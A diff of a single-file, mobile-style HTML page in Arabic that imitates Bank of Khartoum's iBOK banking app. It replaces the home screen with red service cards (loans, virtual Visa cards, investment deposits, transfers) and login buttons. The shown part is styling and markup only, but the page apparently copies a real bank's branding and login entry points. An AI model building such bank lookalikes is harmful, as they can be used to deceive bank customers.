@@ -8,10 +8,10 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
-            --primary-color: #0b5336; /* لون شعار بنك الخرطوم الأخضر الداكن */
-            --secondary-color: #d4af37; /* لون ذهبي */
+            --primary-color: #0b5336;
+            --secondary-color: #d4af37;
             --text-color: #333;
-            --bg-light: #f9f9f9;
+            --bg-light: #f4f4f4;
         }
 
         * {
@@ -37,7 +37,7 @@
             max-width: 412px;
             height: 100%;
             max-height: 100%;
-            background-color: #ffffff;
+            background-color: #f4f4f4;
             display: flex;
             flex-direction: column;
             justify-content: space-between;
@@ -62,238 +62,185 @@
             display: flex;
         }
 
-        /* شريط التنقل العلوي الأول */
-        header {
-            border-bottom: 1px solid #e0e0e0;
-            position: sticky;
-            top: 0;
-            background: #fff;
-            z-index: 1000;
-        }
-
+        /* تنسيقات الواجهة الأولى المحدثة */
         .top-bar {
-            display: flex;
-            justify-content: flex-end;
-            padding: 5px 20px;
-            background-color: #f1f1f1;
-            font-size: 13px;
-        }
-
-        .top-bar span {
-            margin-left: 15px;
-            cursor: pointer;
-        }
-
-        .navbar {
+            background-color: #da1a32;
+            color: white;
+            padding: 12px 15px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 15px 20px;
         }
-
-        .logo-area img {
-            height: 45px;
-        }
-
-        .nav-links {
-            display: flex;
-            gap: 20px;
-            list-style: none;
-        }
-
-        .nav-links a {
-            text-decoration: none;
-            color: var(--text-color);
-            font-weight: 600;
-        }
-
-        .nav-icons {
-            display: flex;
-            gap: 15px;
-            align-items: center;
-        }
-
-        .lang-btn {
-            background: none;
-            border: 1px solid #ccc;
-            padding: 5px 10px;
-            border-radius: 4px;
-            cursor: pointer;
+        .top-bar .logo-section h1 {
+            font-size: 18px;
             font-weight: bold;
         }
-
-        /* قسم البانر الرئيسي */
-        .hero {
-            position: relative;
-            background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('https://images.unsplash.com/photo-1600585154340-be6161a56a0c?auto=format&fit=crop&w=1200&q=80') center/cover;
-            color: #fff;
-            text-align: center;
-            padding: 100px 20px;
+        .top-bar .logo-section span {
+            font-size: 11px;
         }
-
-        .hero h1 {
-            font-size: 32px;
+        .ibok-btn {
+            background-color: #f3c13a;
+            color: #000;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: bold;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        .container {
+            padding: 15px;
+            max-width: 600px;
+            margin: 0 auto;
+            width: 100%;
+        }
+        .login-section {
+            background: white;
+            padding: 12px 15px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+        .login-section h2 {
+            font-size: 16px;
+        }
+        .login-btn {
+            background-color: #da1a32;
+            color: white;
+            padding: 6px 12px;
+            border-radius: 6px;
+            text-decoration: none;
+            font-size: 13px;
+            font-weight: bold;
+            border: none;
+            cursor: pointer;
+        }
+        .section-title {
+            text-align: center;
+            font-size: 13px;
+            color: #666;
             margin-bottom: 15px;
         }
-
-        .hero p {
-            font-size: 18px;
-            margin-bottom: 25px;
+        .services-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-bottom: 20px;
         }
-
-        .btn {
-            background-color: var(--secondary-color);
-            color: #fff;
-            padding: 12px 30px;
-            border: none;
-            border-radius: 5px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            text-decoration: none;
-            display: inline-block;
-        }
-
-        .btn:hover {
-            opacity: 0.9;
-        }
-
-        /* شريط الخدمات السريعة أسفل البانر */
-        .quick-services {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            padding: 20px;
-            background: #fff;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.05);
-            flex-wrap: wrap;
-        }
-
         .service-card {
+            background: white;
+            padding: 20px 10px;
+            border-radius: 8px;
             text-align: center;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.06);
+            border: 1px solid #eee;
+            text-decoration: none;
+            color: #333;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
+        .service-card .icon {
+            width: 32px;
+            height: 32px;
+            margin-bottom: 8px;
+            fill: #da1a32;
+        }
+        .service-card span {
+            font-size: 13px;
+            font-weight: bold;
+        }
+        .grid-list-3 {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        .grid-item-box {
+            background: linear-gradient(to bottom, #b31428, #da1a32);
+            color: white;
+            padding: 15px 10px;
+            border-radius: 8px;
+            text-align: center;
+            text-decoration: none;
+            font-size: 12px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.15);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            border: none;
+        }
+        .grid-item-box svg {
+            width: 28px;
+            height: 28px;
+            fill: white;
+            margin-bottom: 6px;
+        }
+        .tabs-container {
+            display: flex;
+            justify-content: space-around;
+            background: white;
+            border-bottom: 2px solid #ddd;
+            margin-bottom: 15px;
+        }
+        .tab-item {
+            padding: 10px 15px;
+            font-size: 13px;
+            color: #666;
+            text-decoration: none;
+            font-weight: bold;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+        .tab-item.active {
+            color: #b31428;
+            border-bottom: 3px solid #b31428;
+        }
+        .content-box {
+            background: white;
             padding: 15px;
             border-radius: 8px;
-            width: 110px;
-            cursor: pointer;
-            transition: transform 0.2s;
-        }
-
-        .service-card:hover {
-            transform: translateY(-3px);
-        }
-
-        .service-card .icon {
-            width: 50px;
-            height: 50px;
-            background-color: #f7f3e9;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 8px;
-            color: var(--secondary-color);
-            font-size: 20px;
-        }
-
-        .service-card span {
-            font-size: 12px;
-            font-weight: 600;
-        }
-
-        /* قسم اكتشف الحسابات */
-        .accounts-section {
-            padding: 50px 20px;
-            background-color: var(--bg-light);
-            text-align: center;
-        }
-
-        .accounts-section h2 {
-            font-size: 28px;
-            margin-bottom: 10px;
-            color: var(--primary-color);
-        }
-
-        .accounts-section p {
-            color: #666;
-            margin-bottom: 30px;
-        }
-
-        .accounts-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 20px;
-            max-width: 1100px;
-            margin: 0 auto 30px;
-        }
-
-        .account-box {
-            background: #fff;
-            padding: 25px;
-            border-radius: 8px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
-            text-align: right;
-        }
-
-        .account-box h3 {
-            color: var(--primary-color);
-            margin-bottom: 10px;
-        }
-
-        .account-box p {
-            font-size: 14px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
             margin-bottom: 15px;
         }
-
-        .read-more {
-            color: var(--secondary-color);
+        .content-box h3 {
+            font-size: 15px;
+            color: #b31428;
+            margin-bottom: 8px;
+        }
+        .content-box p {
+            font-size: 13px;
+            line-height: 1.6;
+            color: #444;
+            margin-bottom: 12px;
+        }
+        .footer-links {
+            background: #da1a32;
+            color: white;
+            padding: 12px 15px;
+            border-radius: 8px;
+            margin-bottom: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
             text-decoration: none;
             font-weight: bold;
-            font-size: 14px;
-        }
-
-        /* التذييل (Footer) الأول */
-        footer {
-            background-color: #1a1a1a;
-            color: #fff;
-            padding: 40px 20px 20px;
-        }
-
-        .footer-content {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 30px;
-            max-width: 1100px;
-            margin: 0 auto 30px;
-            font-size: 14px;
-        }
-
-        .footer-content h4 {
-            color: var(--secondary-color);
-            margin-bottom: 15px;
-        }
-
-        .footer-content ul {
-            list-style: none;
-        }
-
-        .footer-content ul li {
-            margin-bottom: 8px;
+            font-size: 13px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.15);
             cursor: pointer;
+            border: none;
+            width: 100%;
         }
 
-        .footer-content ul li:hover {
-            color: var(--secondary-color);
-        }
-
-        .copyright {
-            text-align: center;
-            border-top: 1px solid #333;
-            padding-top: 20px;
-            font-size: 12px;
-            color: #aaa;
-        }
-
-        /* تنسيقات الكود الثاني المطلوبة */
+        /* تنسيقات باقي الشاشات والنوافذ المنبثقة الأصلية */
         .ibok-header {
             min-height: 80px;
             background: linear-gradient(to right, #c62828, #e53935, #d32f2f);
@@ -362,10 +309,6 @@
             transition: background 0.2s;
         }
 
-        .btn-top-back:hover, .btn-back:hover {
-            background-color: rgba(255, 255, 255, 0.3);
-        }
-
         .logo-box {
             text-align: center;
             color: #ffffff;
@@ -386,86 +329,6 @@
 
         .portal-section h2 { color: #d32f2f; margin-bottom: 6px; font-size: 18px; font-weight: 800; text-align: center; }
         .portal-section h3 { color: #555; margin-bottom: 16px; font-size: 13px; border-bottom: 2px solid #e2e8f0; display: inline-block; padding-bottom: 4px; text-align: center; width: 100%; }
-
-        .main-banner {
-            background: #ffffff;
-            border: 1px solid #e5e7eb;
-            border-radius: 12px;
-            padding: 12px 16px;
-            margin-bottom: 14px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.02);
-        }
-        .main-banner span { font-weight: 800; font-size: 15px; color: #1f2937; }
-        .ibok-login-btn {
-            background: #e10a14;
-            color: #fff;
-            border: none;
-            padding: 6px 14px;
-            border-radius: 8px;
-            font-size: 12px;
-            font-weight: bold;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            gap: 5px;
-        }
-
-        .service-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 10px;
-            margin-bottom: 12px;
-        }
-
-        .service-option {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 16px 10px;
-            border: 1px solid #e5e7eb;
-            border-radius: 12px;
-            cursor: pointer;
-            background-color: #ffffff;
-            transition: all 0.2s ease;
-            box-shadow: 0 2px 6px rgba(0,0,0,0.02);
-            text-align: center;
-            gap: 8px;
-        }
-
-        .service-option:hover {
-            border-color: #94a3b8;
-        }
-
-        .service-title { font-weight: 700; color: #374151; font-size: 13px; }
-        .service-icon { font-size: 1.8rem; color: #d32f2f; }
-
-        .service-full-width {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 16px 20px;
-            border: 1px solid #e5e7eb;
-            border-radius: 12px;
-            cursor: pointer;
-            background-color: #ffffff;
-            box-shadow: 0 2px 6px rgba(0,0,0,0.02);
-            margin-bottom: 10px;
-            font-weight: 700;
-            color: #374151;
-            font-size: 14px;
-            text-decoration: none;
-        }
-        .service-full-width-content {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-        .service-full-width i:first-child { font-size: 1.4rem; color: #d32f2f; }
-        .service-full-width i.fa-chevron-left { font-size: 0.9rem; color: #9ca3af; }
 
         .form-section {
             padding: 20px;
@@ -922,127 +785,180 @@
 
   <div class="app-screen">
 
-    <!-- الشاشة الرئيسية الأولى (الكود الأول) -->
+    <!-- الشاشة الرئيسية الأولى المحدثة بالكامل -->
     <div class="screen active" id="screenHomeMain">
-        <header>
-            <div class="top-bar">
-                <span>الخاص</span>
-                <span>الأعمال</span>
-                <span>الإلكتروني</span>
-                <span>الأفراد</span>
+        <div class="top-bar">
+            <div class="logo-section">
+                <h1>iBOK</h1>
+                <span>الاستمارة أونلاين</span>
             </div>
-            <div class="navbar">
-                <div class="nav-icons">
-                    <button class="lang-btn">Eng</button>
-                    <span>🔍</span>
-                    <span>☰</span>
-                </div>
-                <ul class="nav-links">
-                    <li><a href="#" onclick="switchScreen('screenHomeMain')">الرئيسية</a></li>
-                </ul>
-                <div class="logo-area">
-                    <strong style="color: var(--primary-color); font-size: 20px;">بنك الخرطوم</strong>
-                </div>
-            </div>
-        </header>
-
-        <section class="hero">
-            <h1>معاملات مصرفية سهلة وآمنة معنا</h1>
-            <p>افتح حساب جاري أو حساب مميز</p>
-            <a href="#" class="btn" onclick="switchScreen('screenServices')">قدم الآن ←</a>
-        </section>
-
-        <div class="quick-services">
-            <div class="service-card" onclick="selectAndProceedService(0, 'العملات الأجنبية')">
-                <div class="icon">💰</div>
-                <span>سعر الصرف</span>
-            </div>
-            <div class="service-card" onclick="switchScreen('screenServices')">
-                <div class="icon">🏛️</div>
-                <span>المساهمين</span>
-            </div>
-            <div class="service-card" onclick="switchScreen('screenServices')">
-                <div class="icon">👤</div>
-                <span>افتح حسابك</span>
-            </div>
-            <div class="service-card" onclick="openTermsModal()">
-                <div class="icon">📄</div>
-                <span>الشروط والأحكام</span>
-            </div>
-            <div class="service-card" onclick="switchScreen('screenServices')">
-                <div class="icon">📖</div>
-                <span>دليل التعرف</span>
-            </div>
+            <a class="ibok-btn" onclick="switchScreen('screenServices')">iBOK الخدمة المصرفية</a>
         </div>
 
-        <section class="accounts-section">
-            <h2>اكتشف الحساب الذي يناسب احتياجاتك</h2>
-            <p>لنفقاتك اليومية، أو مدخراتك الشخصية، وقضاء عطلة طالما كنت تحلم بها...</p>
-            
-            <div class="accounts-grid">
-                <div class="account-box">
-                    <h3>الحساب الجاري</h3>
-                    <p>يوفر حسابنا الجاري لعملائنا سهولة الوصول إلى أموالهم وخدمات مصرفية تسبق الشفافية.</p>
-                    <a href="#" class="read-more" onclick="switchScreen('screenServices')">اقرأ المزيد</a>
-                </div>
-                <div class="account-box">
-                    <h3>حساب التوفير</h3>
-                    <p>لزيادة مدخراتك بمرور الوقت. هذا الحساب مثالي لأولئك الذين يفضلون الادخار لأهداف قصيرة الأجل.</p>
-                    <a href="#" class="read-more" onclick="switchScreen('screenServices')">اقرأ المزيد</a>
-                </div>
-                <div class="account-box">
-                    <h3>حساب ذكري</h3>
-                    <p>حساب ذكري، الذي يقدمه بنك الخرطوم، هو حساب ادخار متخصص مصمم للأطفال.</p>
-                    <a href="#" class="read-more" onclick="switchScreen('screenServices')">اقرأ المزيد</a>
-                </div>
+        <div class="container">
+            <div class="login-section">
+                <h2>الرئيسية</h2>
+                <button class="login-btn" onclick="switchScreen('screenLogin')">iBOK+ Login &rarr;</button>
             </div>
-            
-            <a href="#" class="btn" onclick="switchScreen('screenServices')">عرض الخدمات المصرفية المتاحة</a>
-        </section>
 
-        <footer>
-            <div class="footer-content">
-                <div>
-                    <h4>الصفحة الرئيسية</h4>
-                    <ul>
-                        <li>الأفراد</li>
-                        <li>الأعمال</li>
-                        <li>الإلكتروني</li>
-                    </ul>
+            <div class="section-title">اختر نوع الخدمة التي ترغب بمعالجتها</div>
+
+            <div class="services-grid">
+                <!-- المحفظة الاستثمارية (أيقونة الحقيبة) -->
+                <div class="service-card" onclick="selectAndProceedService(7, 'المحفظة الاستثمارية')">
+                    <svg class="icon" viewBox="0 0 24 24"><path d="M20 6h-3V4c0-1.1-.9-2-2-2H9c-1.1 0-2 .9-2 2v2H4c-1.1 0-2 .9-2 2v11c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2zM9 4h6v2H9V4zm11 15H4V8h16v11z"/></svg>
+                    <span>المحفظة الاستثمارية</span>
                 </div>
-                <div>
-                    <h4>الخدمات</h4>
-                    <ul>
-                        <li>الحسابات</li>
-                        <li>التمويل</li>
-                        <li>بطاقات</li>
-                    </ul>
+                <!-- العملات الأجنبية (أيقونة المحفظة المالية) -->
+                <div class="service-card" onclick="selectAndProceedService(0, 'العملات الأجنبية')">
+                    <svg class="icon" viewBox="0 0 24 24"><path d="M21 18v1c0 1.1-.9 2-2 2H5c-1.11 0-2-.9-2-2V5c0-1.1.89-2 2-2h14c1.1 0 2 .9 2 2v1h-9c-1.11 0-2 .9-2 2v8c0 1.1.89 2 2 2h9zm-9-2h10V8H12v8zm4-2.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/></svg>
+                    <span>العملات الأجنبية</span>
                 </div>
-                <div>
-                    <h4>بنك الخرطوم</h4>
-                    <ul>
-                        <li>عن البنك</li>
-                        <li>اتصل بنا</li>
-                        <li>توجدنا هنا</li>
-                        <li>سياسة الخصوصية</li>
-                    </ul>
+                <!-- قروض شخصية (أيقونة المستند/التقرير) -->
+                <div class="service-card" onclick="selectAndProceedService(1, 'قروض شخصية')">
+                    <svg class="icon" viewBox="0 0 24 24"><path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z"/></svg>
+                    <span>قروض شخصية</span>
                 </div>
-                <div>
-                    <h4>المصادر</h4>
-                    <ul>
-                        <li>أسعار الصرف</li>
-                        <li>خريطة الموقع</li>
-                        <li>الشروط والأحكام</li>
-                    </ul>
+                <!-- بطاقة فيزا افتراضية (أيقونة البطاقة) -->
+                <div class="service-card" onclick="selectAndProceedService(2, 'بطاقة فيزا افتراضية')">
+                    <svg class="icon" viewBox="0 0 24 24"><path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.1.89 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg>
+                    <span>بطاقة فيزا افتراضية</span>
+                </div>
+                <!-- سقف المعاملات اليومية (أيقونة الإحصائيات) -->
+                <div class="service-card" onclick="selectAndProceedService(3, 'سقف المعاملات اليومية')">
+                    <svg class="icon" viewBox="0 0 24 24"><path d="M16 11V3H8v8H2v10h20V11h-6zm-6-6h4v14h-4V5zm-6 8h4v6H4v-6zm16 6h-4v-4h4v4z"/></svg>
+                    <span>سقف المعاملات اليومية</span>
+                </div>
+                <!-- طلب تمويل (أيقونة استمارة التقديم والقلم) -->
+                <div class="service-card" onclick="selectAndProceedService(4, 'طلب تمويل')">
+                    <svg class="icon" viewBox="0 0 24 24"><path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04c.39-.39.39-1.02 0-1.41l-2.34-2.34c-.39-.39-1.02-.39-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z"/></svg>
+                    <span>طلب تمويل</span>
+                </div>
+                <!-- ترقية الحساب (أيقونة التحديث) -->
+                <div class="service-card" onclick="selectAndProceedService(5, 'ترقية الحساب')">
+                    <svg class="icon" viewBox="0 0 24 24"><path d="M12 4V1L8 5l4 4V6c3.31 0 6 2.69 6 6 0 1.01-.25 1.97-.7 2.8l1.46 1.46C19.54 15.03 20 13.57 20 12c0-4.42-3.58-8-8-8zm0 14c-3.31 0-6-2.69-6-6 0-1.01.25-1.97.7-2.8L5.24 7.74C4.46 8.97 4 10.43 4 12c0 4.42 3.58 8 8 8v3l4-4-4-4v3z"/></svg>
+                    <span>ترقية الحساب إلي مميز/جاري</span>
+                </div>
+                <!-- تحويلات خاطئة (أيقونة السهم المعكوس للاسترجاع) -->
+                <div class="service-card" onclick="selectAndProceedService(6, 'تحويلات خاطئة')">
+                    <svg class="icon" viewBox="0 0 24 24"><path d="M10 9V5l-7 7 7 7v-4.1c5 0 8.5 1.6 11 5.1-1-5-4-10-11-11z"/></svg>
+                    <span>تحويلات خاطئة</span>
                 </div>
             </div>
-            <div class="copyright">
-                <p>جميع الحقوق محفوظة © بنك الخرطوم 2026</p>
+
+            <div class="section-title">الخدمات المصرفية الإضافية والتحكم</div>
+            <div class="grid-list-3">
+                <button class="grid-item-box" onclick="switchScreen('screenLogin')">
+                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zM7.07 18.28c.43-.9 3.05-1.78 4.93-1.78s4.5.88 4.93 1.78C15.57 19.33 13.86 20 12 20s-3.57-.67-4.93-1.72zm11.29-1.45c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6zm0 5c-.83 0-1.5-.67-1.5-1.5S11.17 8 12 8s1.5.67 1.5 1.5S12.83 11 12 11z"/></svg>
+                    <span>تفاصيل الحساب</span>
+                </button>
+                <button class="grid-item-box" onclick="switchScreen('screenLogin')">
+                    <svg viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-2 10h-4v4h-2v-4H7v-2h4V7h2v4h4v2z"/></svg>
+                    <span>دفع فواتير</span>
+                </button>
+                <button class="grid-item-box" onclick="switchScreen('screenLogin')">
+                    <svg viewBox="0 0 24 24"><path d="M6.99 11L3 15l3.99 4v-3H14v-2H6.99v-3zM21 9l-3.99-4v3H10v2h7.01v3L21 9z"/></svg>
+                    <span>تحويلات</span>
+                </button>
+                <button class="grid-item-box" onclick="switchScreen('screenLogin')">
+                    <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.1.89 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg>
+                    <span>سحب بدون بطاقة</span>
+                </button>
+                <button class="grid-item-box" onclick="switchScreen('screenLogin')">
+                    <svg viewBox="0 0 24 24"><path d="M3 5v14c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2H5c-1.1 0-2 .9-2 2zm2 2h4v4H5V7zm6 0h4v4h-4V7zm6 0h4v4h-4V7zM5 13h4v4H5v-4zm6 0h4v4h-4v-4zm6 0h4v4h-4v-4z"/></svg>
+                    <span>بنكك PAY</span>
+                </button>
+                <button class="grid-item-box" onclick="selectAndProceedService(7, 'المحفظة الاستثمارية')">
+                    <svg viewBox="0 0 24 24"><path d="M21 18v1c0 1.1-.9 2-2 2H5c-1.11 0-2-.9-2-2V5c0-1.1.89-2 2-2h14c1.1 0 2 .9 2 2v1h-9c-1.11 0-2 .9-2 2v8c0 1.1.89 2 2 2h9zm-9-2h10V8H12v8zm4-2.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/></svg>
+                    <span>طلب الودائع الاستثمارية</span>
+                </button>
+                <button class="grid-item-box" onclick="switchScreen('screenLogin')">
+                    <svg viewBox="0 0 24 24"><path d="M15 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm-9-2V7H4v3H1v2h3v3h2v-3h3v-2H6zm9 4c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+                    <span>إدارة المستفيدين</span>
+                </button>
+                <button class="grid-item-box" onclick="openAccountStatementScreen()">
+                    <svg viewBox="0 0 24 24"><path d="M19 3h-4.18C14.4 1.84 13.3 1 12 1c-1.3 0-2.4.84-2.82 2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-7 0c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm2 14H7v-2h7v2zm3-4H7v-2h10v2zm0-4H7V7h10v2z"/></svg>
+                    <span>المعاملات السابقة</span>
+                </button>
+                <button class="grid-item-box" onclick="switchScreen('screenLogin')">
+                    <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.1.89 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg>
+                    <span>إدارة البطاقات</span>
+                </button>
+                <button class="grid-item-box" onclick="switchScreen('screenLogin')">
+                    <svg viewBox="0 0 24 24"><path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z"/></svg>
+                    <span>طلبات</span>
+                </button>
+                <button class="grid-item-box" onclick="switchScreen('screenLogin')">
+                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
+                    <span>أمر دفع دائم</span>
+                </button>
+                <button class="grid-item-box" onclick="switchScreen('screenLogin')">
+                    <svg viewBox="0 0 24 24"><path d="M19.14 12.94c.04-.3.06-.61.06-.94 0-.32-.02-.64-.07-.94l2.03-1.58c.18-.14.23-.41.12-.61l-1.92-3.32c-.12-.22-.37-.29-.59-.22l-2.39.96c-.5-.38-1.03-.7-1.62-.94l-.36-2.54c-.04-.24-.24-.41-.48-.41h-3.84c-.24 0-.43.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.05.3-.09.63-.09.94s.02.64.07.94l-2.03 1.58c-.18.14-.23.41-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.56 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.6c-1.98 0-3.6-1.62-3.6-3.6s1.62-3.6 3.6-3.6 3.6 1.62 3.6 3.6-1.62 3.6-3.6 3.6z"/></svg>
+                    <span>الضبط</span>
+                </button>
+                <button class="grid-item-box" onclick="selectAndProceedService(2, 'بطاقة فيزا افتراضية')">
+                    <svg viewBox="0 0 24 24"><path d="M7 18c-1.1 0-1.99.9-1.99 2S5.9 22 7 22s2-.9 2-2-.9-2-2-2zM1 2v2h2l3.6 7.59-1.35 2.45c-.16.28-.25.61-.25.96 0 1.1.9 2 2 2h12v-2H7.42c-.14 0-.25-.11-.25-.25l.03-.12.9-1.63h7.45c.75 0 1.41-.41 1.75-1.03l3.58-6.49c.08-.14.12-.31.12-.48 0-.55-.45-1-1-1H5.21l-.94-2H1zm16 16c-1.1 0-1.99.9-1.99 2s.89 2 1.99 2 2-.9 2-2-.9-2-2-2z"/></svg>
+                    <span>التجارة الإلكترونية</span>
+                </button>
+                <button class="grid-item-box" onclick="selectAndProceedService(0, 'العملات الأجنبية')">
+                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 14h-2v-1.5c-1.38 0-2.5-1.12-2.5-2.5h1.5c0 .55.45 1 1 1s1-.45 1-1-.45-1-1-1c-1.38 0-2.5-1.12-2.5-2.5V8h2V6.5h2V8c1.38 0 2.5 1.12 2.5 2.5h-1.5c0-.55-.45-1-1-1s-1 .45-1 1 .45 1 1 1c1.38 0 2.5 1.12 2.5 2.5V16h-2z"/></svg>
+                    <span>خدمات العملات الأجنبية</span>
+                </button>
             </div>
-        </footer>
+
+            <div class="section-title">تفاصيل الودائع الاستثمارية والأرباح الحلال</div>
+            <div class="tabs-container">
+                <button class="tab-item active" onclick="switchMainTab('profitsContent', this)">الأرباح الحلال</button>
+                <button class="tab-item" onclick="switchMainTab('requirementsContent', this)">المتطلبات</button>
+                <button class="tab-item" onclick="switchMainTab('requestContent', this)">طلب الوديعة</button>
+                <button class="tab-item" onclick="switchMainTab('faqContent', this)">الأسئلة الشائعة</button>
+            </div>
+
+            <div class="content-box" id="profitsContent" class="main-tab-content">
+                <h3>الأرباح الحلال</h3>
+                <p>تحقيق الأرباح بطريقة متوافق مع الشريعة الإسلامية، مما يضمن لك أرباحاً مضمونة وحلال.</p>
+                <h3>فترات استثمار مرنة</h3>
+                <p>فترات الاستثمار متاحة لتناسب مجموعة من المتطلبات، مع خيارات متنوعة تناسب احتياجك.</p>
+                <h3>مرونة السحب المبكر</h3>
+                <p>لديك خيار الوصول إلى أموالك مقدماً، شريطة الالتزام بالشروط والأحكام الخاصة بالبنك.</p>
+                <h3>استثمار آمن</h3>
+                <p>يمكنك أن تكون واثقاً من أن أموالك مستثمرة وفقاً لمصارفية آمنة وموثوقة.</p>
+            </div>
+
+            <div class="content-box" id="requirementsContent" class="main-tab-content" style="display: none;">
+                <h3>المتطلبات</h3>
+                <p><strong>1. بطاقة هوية سارية المفعول:</strong> (الهوية الوطنية أو جواز السفر).</p>
+                <p><strong>2. فتح حساب أو وجود حساب جاري / توفير نشط:</strong> لتغذية قيمة الوديعة وإيداع الأرباح فيه.</p>
+                <p><strong>3. تلبية الحد الأدنى للمبلغ:</strong> يحدد البنك حدّاً أدنى لربط الوديعة الاستثمارية حسب نوع الوديعة والعملة (جنيه سوداني أو عملات أجنبية).</p>
+                <p>إذا كنت جاهزاً للبدء، يمكنك التوجه إلى الملف الشخصي وتقديم طلب الوديعة الاستثمارية التي تناسبك.</p>
+            </div>
+
+            <div class="content-box" id="requestContent" class="main-tab-content" style="display: none;">
+                <h3>طلب الوديعة</h3>
+                <p>يمكنك اختيار الوديعة الاستثمارية المناسبة والانضمام إليها مباشرة عبر المحفظة الاستثمارية أو التواصل معنا.</p>
+            </div>
+
